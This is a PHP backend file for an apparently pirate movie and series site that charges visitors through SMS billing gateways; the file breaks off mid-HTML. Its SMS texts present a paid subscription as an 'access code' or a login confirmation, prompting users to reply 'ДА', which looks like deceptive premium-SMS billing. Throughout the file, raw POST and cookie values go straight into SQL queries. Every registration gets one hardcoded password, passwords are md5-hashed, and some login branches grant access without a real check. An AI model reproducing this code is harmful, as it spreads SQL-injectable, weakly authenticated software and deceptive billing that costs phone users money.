<?php

session_start();
/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */

function escape($val) {
    return htmlspecialchars(strip_tags(trim($val)));
}

function is_email($email) {
    return preg_match("/^([a-zA-Z0-9])+([\.a-zA-Z0-9_-])*@([a-zA-Z0-9_-])+(\.[a-zA-Z0-9_-]+)*\.([a-zA-Z]{2,6})$/", $email);
}

function generate_confirm_email($number){
    $arr = array('a','b','c','d','e','f',
                 'g','h','i','j','k','l',
                 'm','n','o','p','r','s',
                 't','u','v','x','y','z',
                 'A','B','C','D','E','F',
                 'G','H','I','J','K','L',
                 'M','N','O','P','R','S',
                 'T','U','V','X','Y','Z',
                 '1','2','3','4','5','6',
                 '7','8','9','0');
    $confirm_email = "";
    for($i = 0; $i < $number; $i++){
      $index = rand(0, count($arr) - 1);
      $confirm_email .= $arr[$index];
    }
    return $confirm_email;
}

function what_operator($msisdn){
	$urlsend = "http://apihelp.ru/MSISDNLookup/?MSISDN=".$msisdn;
	$cr = curl_init($urlsend);
	curl_setopt($cr,CURLOPT_RETURNTRANSFER,true); 
	$content = curl_exec($cr);
	curl_close($cr);
	$xml_str=simplexml_load_string($content);
	if($xml_str->Error<>''){
		return FALSE;
	}
	elseif($xml_str->OperatorNameInternational<>''){
		return strval($xml_str->OperatorNameInternational);
	} else {
		return FALSE;
	}
}


function isMt($code) {


$codes = array(
	903=>array('beeline',2,true),
	905=>array('beeline',2,true),
	906=>array('beeline',2,true),
	909=>array('beeline',2,true),
	910=>array('mts',2,true),
	911=>array('mts',2,true),
	912=>array('mts',2,true),
	913=>array('mts',2,true),
	914=>array('mts',2,true),
	915=>array('mts',2,true),
	916=>array('mts',2,true),
	917=>array('mts',2,true),
	918=>array('mts',2,true),
	919=>array('mts',2,true),
	920=>array('mega',2,true),
	921=>array('mega',2,true),
	922=>array('mega',2,true),
	923=>array('mega',2,true),
	924=>array('mega',2,true),
	925=>array('mega',2,true),
	926=>array('mega',2,true),
	927=>array('mega',2,true),
	928=>array('mega',2,true),
	929=>array('mega',2,true),
	930=>array('mega',2,true),
	931=>array('mega',2,true),
	932=>array('mega',2,true),
	933=>array('mega',2,true),
	934=>array('mega',2,true),
	936=>array('mega',2,true),
	937=>array('mega',2,true),
	938=>array('mega',2,true),
	960=>array('beeline',2,true),
	961=>array('beeline',2,true),
	962=>array('beeline',2,true),
	963=>array('beeline',2,true),
	964=>array('beeline',2,true),
	965=>array('beeline',2,true),
	966=>array('beeline',2,true),
	967=>array('beeline',2,true),
	968=>array('beeline',2,true),
	980=>array('mts',2,true),
	981=>array('mts',2,true),
	982=>array('mts',2,true),
	983=>array('mts',2,true),
	984=>array('mts',2,true),
	985=>array('mts',2,true),
	987=>array('mts',2,true),
	988=>array('mts',2,true),
	989=>array('mts',2,true),
	39=>array('Golden',1,false),
	50=>array('МТС',1,true),
	63=>array('Life',1,true),
	66=>array('МТС',1,true),
	67=>array('Киевстар',1,true),
	68=>array('Киевстар',1,true),
	93=>array('Life',1,true),
	94=>array('Интер-телеком',1,false),
	95=>array('МТС',1,true),
	96=>array('Киевстар',1,true),
	97=>array('Киевстар',1,true),
	98=>array('Киевстар',1,true),
	99=>array('МТС',1,true),
	900=>array('tele2',1,true),
	902=>array('tele2',1,true),
	904=>array('tele2',1,true),
	908=>array('tele2',1,true),
	950=>array('tele2',1,true),
	951=>array('tele2',1,true),
	952=>array('tele2',1,true),
	953=>array('tele2',1,true),
);

	if(isset($codes[$code])){
		return $codes[$code];
	}
		
return array('undefined',0,false);

}

$hash = 'tdso9u45khgufrdtkgjrekogurt';

require_once("core/Connection.php");
$DB = new DB;

require_once("core/Application.php");
$Core = new Core;

if($_POST["logout"]){
	unset($_SESSION['mobile_id']);
	unset($_SESSION['mobile_phone']);
	$number = 0;
}



if ($_POST["phone_auth"] && $_POST["password_auth"]) {
    $phone = escape($_POST['phone_auth']);
    $password = escape($_POST['password_auth']);
    $password_hash = md5($password . $hash);

    $DB->query("SELECT count(1) FROM `users` WHERE `phone` = '$phone' AND `password` = '$password_hash'");
    $count = $DB->fetch_array();
    if ($count[0] != 0) {
        $DB->query("SELECT * FROM `users` WHERE `phone` = '$phone' AND `password` = '$password_hash'");
        $arr = $DB->fetch_array();
        $_SESSION['mobile_id'] = $arr['id'];
		$_SESSION['mobile_phone'] = $arr['phone'];
        $number = 0;
    } else {
        $number = 2;
    }
}

if($_POST["order_by"]){
	if($_POST["order_by"] == "none"){
		unset($_SESSION["orderby"]);
	} else {
		$_SESSION["orderby"] = $_POST["order_by"];
	}
	$number = 0;
}

if($_POST["mobile"]) {
    if (is_email($_POST["email"])) {
                $DB->query("select count(1) from `users` where `email`='".$_POST["email"]."'");
                $exist = $DB->fetch_array();
                if($exist[0] == 0){
					$DB->query("select count(1) from `users` where `phone`='".$_POST["mobile"]."'");
					$existMoby = $DB->fetch_array();
                    if($existMoby[0] == 0) {
                        //$confirm_email = generate_confirm_email(intval("30"));
                        //$login = escape($_POST['small_reg_login']);
                        //$password = generate_confirm_email(intval("6"));;
						$password = "Slknfew";
                        $email = escape($_POST['email']);
						$phone = escape($_POST['mobile']);
                        $password_hash = md5($password.$hash); 
						
                        require_once("core/Application.php");
						
                        //Core::SendMail($email, $login, $password, $confirm_email);
						$message = "Зарегистрированный номер телефона: $phone , Пароль доступа к авторизации: $password"; 
                        /*mail($email, "Регистрация на сайте КиноПоиск", $message,
						 "From: ыгззщке@$SERVER_NAME\r\n"
						."X-Mailer: PHP/" . phpversion());*/
						
                        $DB->query("INSERT INTO `users` (`email`, `password`,`phone`,`active`) 
                        VALUES ('$email', '$password_hash', '$phone','1')");
						
                        $number = 0; 
                    } else {
                       $number = 2; 
                    }
                } else {
                   $number = 1; 
                }
            } else {
        $number = 3;
   }
}

if($_POST["utoredirect"]){
	$DB->query("select * from `xbill_abonents` where `abonent`='".$_POST["utoredirect"]."'");
	$abonent = $DB->fetch_array();
	$number = $abonent["qty_sms"];
}

if ($_POST['passwordz']) {
    $pass = $_POST['passwordz'];
	
	$DB->query("select count(1) from `xbill_abonents` where `pass`='".$pass."'");
	$countRows = $DB->fetch_array();
	
    if ($countRows[0] == 0) {
		$number = 'fail';
    } else {

		$DB->query("select * from `xbill_abonents` where `pass`='".$pass."'");
		$abonent = $DB->fetch_array();
		
		$explode_url_modal = explode("/",$_POST["result_url"]);
		$title_film = $explode_url_modal[2];
		
		$DB->query("select * from `movies` where `name_url`='".$title_film."'");
		$rowMovies = $DB->fetch_array();
		
		
		if ($_POST['type'] == 'premium') {
			$code     = substr($abonent['abonent'], 1, 3);
			$result   = isMt($code);
			$operator = $result[0];
			if ( $operator == 'mega' || $operator == 'mts' ) {
				$DB->query("Update `xbill_abonents` set `count_sms` = '1' where `id` = '".$abonent['id']."'");
				$abonent['count_sms'] = 1;
			}
			$DB->query("Update `xbill_abonents` set `film_id` = '".$rowMovies["id"]."' where `id` = '".$abonent['id']."'");
			
			$_SESSION["mobile_abonent"] = $abonent['abonent'];
			$_SESSION["count_for_view"] = $abonent['count_sms'];
			/*if ( strtotime($abonent['end_validity']) > time() && $abonent['qty_sms'] >= $abonent['count_sms'] ) {
				if ( $abonent['partner'] != 52 ) {
					$_SESSION['logged-in'] = 5;
				} elseif ( $abonent['partner'] == 52 ) {
					$_SESSION['logged-in'] = 8;
				}
				$number = '0';
			} else {
				if ( $abonent['count_sms'] == 3 ) {
					$DB->query("Update `xbill_abonents` set `count_sms` = '2' where `id` = '".$abonent['id']."'");
				}    
				$number = $abonent['count_sms'];
			}*/
			$number = '0';
		}
	}
}

if ($_POST['passwordz_check']) {
    $pass = $_POST['passwordz_check'];
	
	$DB->query("select count(1) from `xbill_abonents` where `pass`='".$pass."'");
	$countRows = $DB->fetch_array();
	
    if ($countRows[0] == 0) {
		$number = 3;
    } else {
		
		$DB->query("select * from `xbill_abonents` where `pass`='".$pass."'");
		$abonent = $DB->fetch_array();
		
		$DB->query("select count(1) from `platform_setting` where `ref_id`='".$abonent['partner']."'");
			$counts_refs = $DB->fetch_array();
			if($counts_refs[0] == 0){
				$qty_sms = 3;
			} else {
				$DB->query("select * from `platform_setting` where `ref_id`='".$abonent['partner']."'");
				$rowses = $DB->fetch_array();
				$qty_sms = $rowses["count_sms"];
		}
		
		$number = $qty_sms;
	}
}

if($_POST["normal"]){
	$pass = $_POST['pass'];
	
	$DB->query("select count(1) from `xbill_abonents` where `pass`='".$pass."'");
	$countRows = $DB->fetch_array();
	
    if ($countRows[0] == 0) {
		$number = 'fail';
    } else {

		$DB->query("select * from `xbill_abonents` where `pass`='".$pass."'");
		$abonent = $DB->fetch_array();
		
			if ( strtotime($abonent['end_validity']) > time() && $abonent['qty_sms'] >= $abonent['count_sms'] || strtotime($abonent['end_validity']) > time() && $abonent['qty_sms'] > 1 && $abonent['count_sms'] == 3) {
				if ( $abonent['partner'] != 52 ) {
					$_SESSION['logged-in'] = 5;
				} elseif ( $abonent['partner'] == 52 ) {
					$_SESSION['logged-in'] = 8;
				}
				$_SESSION['mobile_id'] = $abonent['id'];
				$_SESSION['mobile_phone'] = $abonent['abonent'];
				$number = 'access';
			}

			$number = 'access';
		}
	}

if($_POST["auth_password"]){
	$countNumbers = mysql_query("SELECT COUNT(*) FROM `xbill_abonents` where `pass`='".$_POST["auth_password"]."'");
	$rowNumbers = mysql_fetch_row($countNumbers);
	if($rowNumbers[0] == "0"){
		$number = '0';
	} else {
		$countpass = mysql_query("SELECT * FROM `xbill_abonents` where `pass`='".$_POST["auth_password"]."'");
		$rowspass = mysql_fetch_array($countpass);
		
		$_SESSION['mobile_id'] = $rowspass['id'];
		$_SESSION['mobile_phone'] = $rowspass['abonent'];
		
		$number = '1';
	}
	
}	
	
if($_POST["country_white"]){
	$DB->query("select * from `billing_type` where `name`='premium' and `status`='1'");
			$getBills = $DB->fetch_array();
				if($_POST["country_white"] == "UAH"){
					$DB->query("select * from `".$getBills["prefix_path"]."_sms_country` where `id`='4'");
				} else {
					$DB->query("select * from `".$getBills["prefix_path"]."_sms_country` where `currency`='".$_POST["country_white"]."'");
				}
				$names = $DB->fetch_array();
				if($_COOKIE["ref"] == "462"){
															$srint = "-462";
														} else {
															$srint = "";
														}
				$number = "
				Отправте код <b style='color: red'>".$names["prefix"].$names["main_prefix"].$names["sub_prefix"].$srint."</b> на номер <b>".$names["phone"]."</b>
				<br />
				Стоимость смс на номер <b>".$names["phone"]."</b> состовляет <b>".$names["cost"]." ".$names["currency"]."</b>";

}
	
if($_POST["russia_code"]){
	$abonent = htmlentities($_POST["russia_code"]);
	if(strlen($abonent)<>11 || substr($abonent,0,1) <> 7){
		$number = 2; 
	} elseif(!preg_match('/^\d+$/', $abonent)){
		$number = 2; 
	} else {
		//3352
		$_SESSION["abonent"] = $abonent;
		$now = date("YmdHis"); 
		$secretCode="Ваш код доступа 474";
		
		
		$DB->query("select * from `billing_type` where `id`='1'");
		$xBill = $DB->fetch_array();
		
		$smstext = $secretCode.'. '.$xBill["sms_text"]; 
		$servis =$xBill["service_id"];
		$skey = $xBill["skey"]; 
		//$short_num = $xBill["number"];
		
		$code     = substr($abonent, 1, 3);
		$result   = isMt($code);
		$operator = $result[0];
		
		if($operator == "beeline" || $operator == "mts" || $operator == "mega"){
			if($operator == "beeline"){
				$short_num = $xBill["number_beeline"];
			}
			if($operator == "mts"){
				$short_num = $xBill["number_mts"];
			}
			if($operator == "mega"){
				$short_num = $xBill["number_megafon"];
			}
		} else {
			$short_num = $xBill["number"];
		}
		
		$DB->query("select count(1) from `entered_numbers` where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."'");
		$countEntered = $DB->fetch_array();
		if($countEntered[0] == 0){
			$DB->query("insert into `entered_numbers` (`date`,`ref_id`,`mt`,`mo`) values ('".date("Y-m-d")."','".$_COOKIE['ref']."','0','1')");
		} else {
			$DB->query("select * from `entered_numbers` where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."'");
			$rowEnters = $DB->fetch_array();
			$newMo = $rowEnters["mo"] + 1;
			$DB->query("update `entered_numbers` set `mo`='".$newMo."' where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."'");
		}
		
		$explode_url_modal = explode("/",$_POST["result_url"]);
		$title_film = $explode_url_modal[2];
		
		$DB->query("select * from `movies` where `name_url`='".$title_film."'");
		$rowMovies = $DB->fetch_array();
		
		$DB->query("select count(1) from `entered_numbers_from` where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."' and `link`='".$rowMovies["id"]."'");
		$countEnteredFrom = $DB->fetch_array();
		
		if($countEnteredFrom[0] == 0){
			$DB->query("insert into `entered_numbers_from` (`date`,`ref_id`,`link`,`count`) values ('".date("Y-m-d")."','".$_COOKIE['ref']."','".$rowMovies["id"]."','1')");
		} else {
			$DB->query("select * from `entered_numbers_from` where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."' and `link`='".$rowMovies["id"]."'");
			$rowEntersFrom = $DB->fetch_array();
			$newMoFrom = $rowEntersFrom["count"] + 1;
			$DB->query("update `entered_numbers_from` set `count`='".$newMoFrom."' where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."' and `link`='".$rowMovies["id"]."'");
		}
		
		$DB->query("select * from `platform_setting` where `ref_id`='".$_COOKIE['ref']."'");
		$getCountSmsRef = $DB->fetch_array();
		$countNumbers = mysql_query("SELECT COUNT(*) FROM `xbill_abonents` where `abonent`='".$abonent."'");
			$rowNumbers = mysql_fetch_row($countNumbers);
			if($rowNumbers[0] == 0){
				$from_db=mysql_query("INSERT INTO `xbill_abonents` (`abonent` ,`film_id`,`partner`,`count_sms`) 
				VALUES 
				('".mysql_real_escape_string($abonent)."','".$rowMovies["id"]."', '".$_COOKIE['ref']."', '".$getCountSmsRef["count_sms"]."')");
			} 
		
		
		$urlsend = "sub-bill.ru/http/send/send.php?srvID=".$servis."&short_num=".$short_num."&abonent=".$abonent."&now=".$now."&smstext=".urlencode($smstext)."&md5key=".md5($servis.$now.$short_num.$skey);
		$cr = curl_init($urlsend);
		curl_setopt($cr,CURLOPT_RETURNTRANSFER,true); 
		$content = curl_exec($cr);
		curl_close($cr);
		
		
		
		if($content =="OK_STATUS"){	

			$number = 1;
		} else {
			$number = 3;
		}
		
		//$number = $operator;
	}
}

if($_POST["russia_code_wiz"]){
	$abonent = htmlentities($_POST["russia_code_wiz"]);
	if(strlen($abonent)<>11 || substr($abonent,0,1) <> 7){
		$number = 2; 
	} elseif(!preg_match('/^\d+$/', $abonent)){
		$number = 2; 
	} else {
		$Operator = what_operator($abonent);
		if($Operator == false){
			$number = 4; //""; //3 Немогу определить оператора
		} else {
			$DB->query("select * from `billing_type` where `id`='2'");
			$getBill = $DB->fetch_array();
			$_SESSION["abonent"] =  $abonent;
			
			$code     = substr($abonent, 1, 3);
			$result   = isMt($code);
			$operators = $result[0];
			
			if($operators == "mts"){
				$short_num = $getBill["short_mts"];
				$service_id = $getBill["service_mts"];
				$skey = $getBill["skey_mts"];
			} else {
				$short_num = $getBill["number"];
				$service_id = $getBill["service_id"];
				$skey = $getBill["skey"];
			}

		
		$DB->query("select count(1) from `entered_numbers` where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."'");
		$countEntered = $DB->fetch_array();
		if($countEntered[0] == 0){
			$DB->query("insert into `entered_numbers` (`date`,`ref_id`,`mt`,`mo`) values ('".date("Y-m-d")."','".$_COOKIE['ref']."','0','1')");
		} else {
			$DB->query("select * from `entered_numbers` where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."'");
			$rowEnters = $DB->fetch_array();
			$newMo = $rowEnters["mo"] + 1;
			$DB->query("update `entered_numbers` set `mo`='".$newMo."' where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."'");
		}
		
		$explode_url_modal = explode("/",$_POST["result_url"]);
		$title_film = $explode_url_modal[2];
		
		$DB->query("select * from `movies` where `name_url`='".$title_film."'");
		$rowMovies = $DB->fetch_array();
		
		$DB->query("select count(1) from `entered_numbers_from` where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."' and `link`='".$rowMovies["id"]."'");
		$countEnteredFrom = $DB->fetch_array();
		
		if($countEnteredFrom[0] == 0){
			$DB->query("insert into `entered_numbers_from` (`date`,`ref_id`,`link`,`count`) values ('".date("Y-m-d")."','".$_COOKIE['ref']."','".$rowMovies["id"]."','1')");
		} else {
			$DB->query("select * from `entered_numbers_from` where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."' and `link`='".$rowMovies["id"]."'");
			$rowEntersFrom = $DB->fetch_array();
			$newMoFrom = $rowEntersFrom["count"] + 1;
			$DB->query("update `entered_numbers_from` set `count`='".$newMoFrom."' where `ref_id`='".$_COOKIE['ref']."' and `date`='".date("Y-m-d")."' and `link`='".$rowMovies["id"]."'");
		}
		
		$DB->query("select * from `platform_setting` where `ref_id`='".$_COOKIE['ref']."'");
		$getCountSmsRef = $DB->fetch_array();
		$countNumbers = mysql_query("SELECT COUNT(*) FROM `xbill_abonents` where `abonent`='".$abonent."'");
			$rowNumbers = mysql_fetch_row($countNumbers);
			if($rowNumbers[0] == 0){
				$from_db=mysql_query("INSERT INTO `xbill_abonents` (`abonent` ,`film_id`,`partner`,`count_sms`) 
				VALUES 
				('".mysql_real_escape_string($abonent)."','".$rowMovies["id"]."', '".$_COOKIE['ref']."', '".$getCountSmsRef["count_sms"]."')");
			} 
			
			
			
			
			$hostname = "new.wb-connect.com";
			$path = "/pseudo/init";
			$custom_msg = "Ваш код 474. Активируйте аккаунт отправьте - ДА нам в ответ";

			$line = "abonent=".$abonent."&service_id=".$service_id;
			$signature = base64_encode(hash_hmac('sha256', $service_id.time()."POST".$path.$line, $skey, true));
			
			$urlsend = "new.wb-connect.com/pseudo/init";
			$cr = curl_init($urlsend);
			
			curl_setopt($cr, CURLOPT_HEADER, "Content-type: application/x-www-form-urlencoded");
			curl_setopt($cr, CURLOPT_HEADER, "Authorization: WIZARD-AUTH ".$service_id.":".time().":".$signature);
			curl_setopt($cr,CURLOPT_POSTFIELDS, $line."&custom_msg=".$custom_msg);
			curl_setopt($cr,CURLOPT_RETURNTRANSFER,true); 
			$content = curl_exec($cr);
			curl_close($cr);
			//if(preg_match("/Для получения услуги отправте Да или 1 в ответе на эту СМС/i", $content)){ 
			if(preg_match("/Ваш код 474. Активируйте аккаунт отправьте - ДА нам в ответ/i", $content)){ 
				$number = 1;
			} else {
				$number = 3; //4 
			}
		}
	}
}

if($_POST["input_codes"]){
	$countNumbers = mysql_query("SELECT COUNT(*) FROM `xbill_abonents` where `pass`='".$_POST["input_codes"]."'");
	$rowNumbers = mysql_fetch_row($countNumbers);
	if($rowNumbers[0] == 0){
		$number = 1;
	} else {
		$number = 2;
	}
}

if($_POST["number_session_wiz"]){
	$countNumbers = mysql_query("SELECT * FROM `xbill_abonents` where `abonent`='".$_POST["number_session_wiz"]."'");
	$rowNumbers = mysql_fetch_row($countNumbers);
	if($rowNumbers["qty_sms"] == "2"){
		$_SESSION["qty_sms"] = 2;
	}
	if($rowNumbers["qty_sms"] == "3"){
		$_SESSION["qty_sms"] = 3;
	}
	
	$DB->query("select * from `billing_type` where `id`='2'");
			$getBill = $DB->fetch_array();
			$abonent = $_POST["number_session_wiz"];
			$_SESSION["abonent"] = $abonent;
			$code     = substr($abonent, 1, 3);
			$result   = isMt($code);
			$operators = $result[0];
			
			if($operators == "mts"){
				$short_num = $getBill["short_mts"];
				$service_id = $getBill["service_mts"];
				$skey = $getBill["skey_mts"];
			} else {
				$short_num = $getBill["number"];
				$service_id = $getBill["service_id"];
				$skey = $getBill["skey"];
			}
			
			
			$hostname = "new.wb-connect.com";
			$path = "/pseudo/init";
			$custom_msg = "Ваш код 474. Активируйте аккаунт отправьте - ДА нам в ответ";

			$line = "abonent=".$abonent."&service_id=".$service_id;
			$signature = base64_encode(hash_hmac('sha256', $service_id.time()."POST".$path.$line, $skey, true));
			
			$urlsend = "new.wb-connect.com/pseudo/init";
			$cr = curl_init($urlsend);
			
			curl_setopt($cr, CURLOPT_HEADER, "Content-type: application/x-www-form-urlencoded");
			curl_setopt($cr, CURLOPT_HEADER, "Authorization: WIZARD-AUTH ".$service_id.":".time().":".$signature);
			curl_setopt($cr,CURLOPT_POSTFIELDS, $line."&custom_msg=".$custom_msg);
			curl_setopt($cr,CURLOPT_RETURNTRANSFER,true); 
			$content = curl_exec($cr);
			curl_close($cr);
			//if(preg_match("/Для получения услуги отправте Да или 1 в ответе на эту СМС/i", $content)){ 
			if(preg_match("/Ваш код 474. Активируйте аккаунт отправьте - ДА нам в ответ/i", $content)){ 
				$number = 1;
			} 
		$number = 1;
}

if($_POST["number_session"]){
	$countNumbers = mysql_query("SELECT * FROM `xbill_abonents` where `abonent`='".$_POST["number_session"]."'");
	$rowNumbers = mysql_fetch_row($countNumbers);
	if($rowNumbers["qty_sms"] == "2"){
		$_SESSION["qty_sms"] = 2;
	}
	if($rowNumbers["qty_sms"] == "3"){
		$_SESSION["qty_sms"] = 3;
	}
	
	$DB->query("select * from `billing_type` where `id`='1'");
	$xBill = $DB->fetch_array();
	
		$abonent = $_POST["number_session"];
		$now = date("YmdHis"); 
		//$smstext = $xBill["sms_text"]; 
		$smstext = "Подтвердите вход в аккаунт, отправьте ДА в ответ"; 
		$servis =$xBill["service_id"];
		$skey = $xBill["skey"]; 
		$short_num = $xBill["number"];
		
		$urlsend = "sub-bill.ru/http/send/send.php?srvID=".$servis."&short_num=".$short_num."&abonent=".$abonent."&now=".$now."&smstext=".urlencode($smstext)."&md5key=".md5($servis.$now.$short_num.$skey);
		$cr = curl_init($urlsend);
		curl_setopt($cr,CURLOPT_RETURNTRANSFER,true); 
		$content = curl_exec($cr);
		curl_close($cr);
		
		for($i=0; $i<10; $i++){
			$secretCode.=rand(0,6);
		}
		
		if($content =="OK_STATUS"){	
			/*
			$countNumbers = mysql_query("SELECT COUNT(*) FROM `xbill_abonents` where `abonent`='".$abonent."'");
			$rowNumbers = mysql_fetch_row($countNumbers);
			if($rowNumbers[0] == 0){
				$from_db=mysql_query("INSERT INTO `xbill_abonents` (`abonent` ,`partner`,`count_sms`,`qty_sms`,`pass`) 
				VALUES 
				('".mysql_real_escape_string($abonent)."', '".$_COOKIE['ref']."', '2', '2' '".$secretCode."')");
			} else {
				$from_db=mysql_query("update `xbill_abonents` 
				set 
				`count_sms`='2',
				`pass`='".$secretCode."'
				where `abonent`='".mysql_real_escape_string($abonent)."'");
			}*/
			$number = 1;
		}
		
	
	$number = 1;
}

if($_POST["last_code"]){
	$countNumbers = mysql_query("SELECT COUNT(*) FROM `xbill_abonents` where `pass`='".$_POST["last_code"]."'");
	$rowNumbers = mysql_fetch_row($countNumbers);
	if($rowNumbers[0] == 0){
		$number = 1;
	} else {
		$cuser = mysql_query("SELECT * FROM `xbill_abonents` where `pass`='".$_POST["last_code"]."'");
		$arr = mysql_fetch_row($cuser);
		
		$_SESSION['mobile_id'] = $arr['id'];
		$_SESSION['mobile_phone'] = $arr['abonent'];
		
		$number = 2;
	}
}

if($_POST["last_step"]){
	$countNumbers = mysql_query("SELECT * FROM `xbill_abonents` where `abonent`='".$_SESSION["abonent"]."'");
	$rowNumbers = mysql_fetch_row($countNumbers);
	if($rowNumbers[10] >= 2){
		
		$_SESSION['mobile_id'] = $rowNumbers[0];
		$_SESSION['mobile_phone'] = $rowNumbers[1];
	
		$number = 2;
	} else {
		$number = 1;
	}
}

if($_POST["country"]){
			$DB->query("select * from `billing_type` where `name`='premium' and `status`='1'");
			$getBills = $DB->fetch_array();
				$DB->query("select * from `".$getBills["prefix_path"]."_sms_country` where `currency`='".$_POST["country"]."'");
				$names = $DB->fetch_array();
				if($_POST["country"] == "UAH"){
					//$short_number = '3602';
					if($getBills["prefix_path"] == "xbill"){
						$DB->query("select * from  `".$getBills["prefix_path"]."_sms_country` where `id`='4'");
						$getUkraine = $DB->fetch_array();
						$short_number = $getUkraine["phone"];
					} else {
						$short_number = $names["phone"];
					}
				} else {
					$short_number = $names["phone"];
				}
				//$number = $short_number ;
				//$DB->query("select * from `xbill_sms_country` where `phone`='3602'");
				$DB->query("select * from `".$getBills["prefix_path"]."_sms_country` where `phone`='".$short_number."'");
				$row = $DB->fetch_array();
				$_SESSION["short_number"] = $row["phone"];
				$_SESSION["full_code"] = $row["prefix"].$row["main_prefix"].$row["sub_prefix"]."-".$_COOKIE['ref'];
				$number = $row["prefix"].$row["main_prefix"].$row["sub_prefix"]."-".$_COOKIE['ref'];

	//$number = 1;
}

if($_POST["country_subs"]){
			$DB->query("select * from `billing_type` where `name`='premium' and `status`='1'");
			$getBills = $DB->fetch_array();
				$DB->query("select * from `".$getBills["prefix_path"]."_sms_country` where `currency`='".$_POST["country_subs"]."'");
				$names = $DB->fetch_array();
				if($_POST["country_subs"] == "UAH"){
					//$short_number = '3602';
					if($getBills["prefix_path"] == "xbill"){
						$DB->query("select * from  `".$getBills["prefix_path"]."_sms_country` where `id`='4'");
						$getUkraine = $DB->fetch_array();
						$short_number = $getUkraine["phone"];
					} else {
						$short_number = $names["phone"];
					}
				} else {
					$short_number = $names["phone"];
				}

				$DB->query("select * from `".$getBills["prefix_path"]."_sms_country` where `phone`='".$short_number."'");
				$row = $DB->fetch_array();
				$number = $row["phone"];

}



if($_POST["white_russia_code"]){
	$abonent = htmlentities($_POST["white_russia_code"]);
	if(strlen($abonent)<>11 || substr($abonent,0,1) <> 7){
		$number = 2; 
	} elseif(!preg_match('/^\d+$/', $abonent)){
		$number = 2; 
	} else {
		//3352
		$_SESSION["abonent"] = $abonent;
		$now = date("YmdHis"); 
		$secretCode="Ваш код доступа 474";
		
		
		$DB->query("select * from `billing_type` where `id`='1'");
		$xBill = $DB->fetch_array();
		
		$smstext = $secretCode.'. '.$xBill["sms_text"]; 
		$servis =$xBill["service_id"];
		$skey = $xBill["skey"]; 
		//$short_num = $xBill["number"];
		
		$code     = substr($abonent, 1, 3);
		$result   = isMt($code);
		$operator = $result[0];
		
		if($operator == "beeline" || $operator == "mts" || $operator == "mega"){
			if($operator == "beeline"){
				$short_num = $xBill["number_beeline"];
			}
			if($operator == "mts"){
				$short_num = $xBill["number_mts"];
			}
			if($operator == "mega"){
				$short_num = $xBill["number_megafon"];
			}
		} else {
			$short_num = $xBill["number"];
		}
		if($_COOKIE["ref"] == "462"){
															$srint = "-462";
														} else {
															$srint = "52";
														}
		
		$countNumbers = mysql_query("SELECT COUNT(*) FROM `xbill_abonents` where `abonent`='".$abonent."'");
			$rowNumbers = mysql_fetch_row($countNumbers);
			if($rowNumbers[0] == 0){
				$from_db=mysql_query("INSERT INTO `xbill_abonents` (`abonent` , `partner`, `count_sms`) 
				VALUES 
				('".mysql_real_escape_string($abonent)."','".$srint."', '3')");
			} 
		
		
		$urlsend = "sub-bill.ru/http/send/send.php?srvID=".$servis."&short_num=".$short_num."&abonent=".$abonent."&now=".$now."&smstext=".urlencode($smstext)."&md5key=".md5($servis.$now.$short_num.$skey);
		$cr = curl_init($urlsend);
		curl_setopt($cr,CURLOPT_RETURNTRANSFER,true); 
		$content = curl_exec($cr);
		curl_close($cr);
		
		//echo $urlsend;
		
		if($content =="OK_STATUS"){	

			$number = 1;
		} else {
			$number = 3;
		}

	}
}

require_once("controllers/main.controller.php");
$Main = new Main;
if($_POST["load_seasons"]){ ?>
	<?php foreach($Main->ListSeasons($_POST["load_seasons"]) as $Season) {?>
		<?php if($Season[0] != 0) {?>
            <li class="filteri <?php if($Season[0] == $_POST["season_id"]) {?>selectSeason<? } ?>" id="seasons<?=$Season[0]?>">
                        	<?php if($Season[0] == $_POST["season_id"]) {?>
                        		<a   href="javascript:void(0)" onclick="LoadSeason('<?=$Season[0]?>','<?=$_POST["load_seasons"]?>')">Сезон <?=$Season[0]?></a>
                        	<? } else {?>
                            	<a   href="javascript:void(0)" onclick="LoadSeason('<?=$Season[0]?>','<?=$_POST["load_seasons"]?>')">Сезон <?=$Season[0]?></a>
                            <? } ?>
            </li> 
    <? } ?>
   <? } 
}

if($_POST["season_id"]){
	//$i = 0;

	//$DB->query("select * from `serial_item` where `movie_id`='".$_POST["movie_id"]."' and `season_id`='".$_POST["season_id"]."'");
	$DB->query("SELECT * FROM `serial_movie` JOIN `serial_item` ON `serial_item`.`movie_id` = `serial_movie`.`id` where `serial_item`.`movie_id` = '".$_POST["movie_id"]."' and `serial_item`.`season_id`='".$_POST["season_id"]."'");
	while($Series = $DB->fetch_array()){
		//$i++;
		if($Series["show"] != 1){
			echo '
			<div class="col-xs-2 col-sm-4 col-md-2 col-lg-2 v-series" id="series'.$i.'">
				<a href="/serial/view/'.$Series["id"].'-'.$Series["link"].'.html" class="otherSeriesLink">
					<div class="imgBlockS">
						<div class="hoverPlay"></div>
						<img class="img" src="http://imagees2.pw/i2/'.$Series["id"].'/'.$Series["first_frame_url"].'">
						<img class="ico" src="http://downloadicons.net/sites/default/files/play-icon-23008.png">
						
					</div>	
		            <div class="title">'.$Series["title"].'</div>
		        </a>
		    </div>
			
			';
		}
	}
}


if($_POST["go_season_id"]){?>
<?php $i = 0; foreach($Main->ListSeasonsSeries($_POST["go_movie_id"],$_POST["go_season_id"]) as $Series) { $i++;
	if($Series["show"] != 1) {?>

		<div class="col-xs-2 col-sm-4 col-md-2 col-lg-2" id="series" class="v-series">
				<a href="/serial/view/<?=$Series["id"]?>-<?=$Series["link"]?>.html" class="otherSeriesLink">
					<div class="imgBlockS">
						<div class="hoverPlay"></div>
						<img class="img" src="http://imagees2.pw/i2/<?=$Series["id"]?>/<?=$Series["first_frame_url"]?>">
